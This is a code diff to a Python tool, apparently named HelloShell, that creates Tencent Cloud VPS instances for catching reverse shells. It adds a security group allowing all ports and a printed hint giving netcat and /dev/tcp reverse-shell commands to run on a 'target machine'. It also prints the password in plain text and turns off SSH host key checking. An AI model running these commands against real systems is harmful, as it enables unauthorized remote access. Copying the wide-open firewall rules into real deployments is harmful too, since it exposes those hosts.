@@ -64,8 +64,46 @@ def check_security_group(cred, clientProfile,region):
         for group in security_groups:
             if "放通全部端口" in group["SecurityGroupName"]:
                 return group["SecurityGroupId"] 
-        print("\n没有检测到全通安全组，使用默认配置")
+        print("\n没有检测到全通安全组，正在创建...")
+        return create_security_group(cred, clientProfile, region)
+
+
+    except TencentCloudSDKException as err:
+        print(f"Error occurred: {err}")
         return None
+    
+# 安全组创建
+def create_security_group(cred, clientProfile, region):
+    try:
+        client = vpc_client.VpcClient(cred, region, clientProfile)
+
+        req = vpc_models.CreateSecurityGroupWithPoliciesRequest()
+        params = {
+        "GroupName": "HelloShell-放通全部端口",
+        "GroupDescription": "放通全部端口-buildByHelloShell",
+        "SecurityGroupPolicySet": {
+            "Egress": [
+                {
+                    "PolicyIndex": 0,
+                    "Protocol": "ALL",
+                    "Port": "ALL",
+                    "Action": "ACCEPT"
+                }
+            ],
+            "Ingress": [
+                {
+                    "Protocol": "ALL",
+                    "Port": "ALL",
+                    "Action": "ACCEPT"
+                }
+            ]
+        }
+    }
+        req.from_json_string(json.dumps(params))
+        resp = client.CreateSecurityGroupWithPolicies(req)
+        resp_json = json.loads(resp.to_json_string())
+        print(f"创建安全组 {resp_json['SecurityGroup']['SecurityGroupId']} 成功")
+        return resp_json["SecurityGroup"]["SecurityGroupId"]
 
     except TencentCloudSDKException as err:
         print(f"Error occurred: {err}")
@@ -205,6 +243,9 @@ def terminate_instance(cred, clientProfile, InstanceIds=None):
         print(err)
 
 def start_ssh_session(username, ip):
+    if ip is None:
+        print("实例创建出现问题，请检查日志")
+        return
     ssh_command = ["ssh", "-o", "StrictHostKeyChecking=no", f"{username}@{ip}"]
     subprocess.run(ssh_command)
 
@@ -219,7 +260,7 @@ if __name__ == "__main__":
 
 
     print("\n了解你的捍卫者：")
-    print(">1 VPS，启动！(默认使用模块3)")
+    print(">1 VPS，启动！(默认使用模块2)")
     print(">2 到底要选哪个呢？(自定义启动模块)")
     print(">3 全都烧光！(退还所有实例)")
 
@@ -232,13 +273,13 @@ if __name__ == "__main__":
 
     if choice == '1':
         # 默认使用模块3创建一台服务器
-        region, params = module_loader("module_3")
+        region, params = module_loader("module_2")
         openID = check_security_group(cred, vpc_clientProfile, region)
         instance_id = create_instance(cred, cvm_clientProfile, region, params, openID, passwd)
         describe_instances(cred, cvm_clientProfile, region, instance_id)
         print("初始化ssh连接...")
         print(f"提示:您可以使用 'nc -lvnp 9001' 建立监听，在使用目标机上使用 'sh -i >& /dev/tcp/{ip}/9001 0>&1' 或者 'nc {ip} 9001 -e sh' 建立反弹shell  ")
-        print(f"ssh ubuntu@{ip}")
+        print(f"ssh ubuntu@{ip} 如果非公钥登录请使用设置的密码 {passwd} ")
         start_ssh_session('ubuntu', ip)
         start_ssh_session('ubuntu', ip)
         
@@ -252,7 +293,7 @@ if __name__ == "__main__":
         for key, value in templates.items():
             print(f"{key}: {value['description']}, 资费信息: {value['Price']}")
 
-        module_choice = input("\n请选择要使用的模块 (例如: module_1): ")
+        module_choice = input("\n请选择要使用的模块 (例如: module_3): ")
         if module_choice in templates:
             region, params = module_loader(module_choice)
             openID = check_security_group(cred, vpc_clientProfile, region)
